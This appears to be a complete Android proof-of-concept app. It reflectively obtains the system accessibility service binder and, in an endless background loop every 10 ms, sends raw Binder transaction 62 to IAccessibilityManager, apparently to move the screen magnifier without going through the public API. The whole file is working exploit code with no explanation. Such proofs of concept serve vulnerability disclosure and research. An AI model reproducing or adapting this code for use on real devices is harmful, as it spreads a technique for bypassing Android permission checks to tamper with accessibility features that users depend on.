package poc.app;

import android.app.Activity;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        try {
            IBinder binder = (IBinder) Class.forName("android.os.ServiceManager")
                    .getMethod("getService", String.class)
                    .invoke(null, "accessibility");

            new Thread(() -> moveMagnifier(binder)).start();
        } catch (Throwable th) {
            throw new RuntimeException(th);
        }
    }

    private void moveMagnifier(IBinder binder) {
        try {
            while (true) {
                Parcel parcel = Parcel.obtain();
                parcel.writeInterfaceToken("android.view.accessibility.IAccessibilityManager");
                parcel.writeFloat(1);
                parcel.writeFloat(1);

                Parcel reply = Parcel.obtain();

                binder.transact(62, parcel, reply, 0);
                reply.readException();

                Thread.sleep(10);
            }
        } catch (Throwable th) {
            throw new RuntimeException(th);
        }
    }
}